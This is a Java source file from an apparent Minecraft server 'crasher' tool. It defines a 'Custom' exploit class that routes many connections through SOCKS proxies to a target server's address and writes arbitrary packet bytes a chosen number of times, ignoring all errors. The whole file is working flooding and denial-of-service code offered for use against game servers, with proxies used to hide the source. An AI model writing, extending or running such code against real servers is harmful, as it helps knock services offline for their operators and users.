package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.ProxyHelper;
import uwu.narumi.crasher.api.optimizer.Optimizer;

@ExploitInfo(
    name = "Custom",
    description = "You can send custom packet data"
)
public class Custom extends Exploit {

  public Custom() {
    super(
        new Argument("address", 0, McAddress.class),
        new Argument("amount", 1, Integer.class),
        new Argument("packet data", 2, Byte[].class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    index.set(0);

    McAddress address = (McAddress) args[0];
    int amount = (int) args[1];
    byte[] bytes = (byte[]) args[2];

    Optimizer.startOptimizing(Custom.class);
    Optimizer.post(() -> {
      Proxy proxy = ProxyHelper.getSocks();
      try {
        Socket socket = ProxyHelper.createSocket(proxy);
        if (socket == null) {
          throw new ThreadDeath();
        }

        socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
        socket.getOutputStream().write(bytes);

        Optimizer.update();
        System.out.println(String
            .format("%s -> %s | %s/%s", proxy, address, index.getAndIncrement(),
                amount));
      } catch (Exception ignored) {
      }
    }, amount);
  }
}
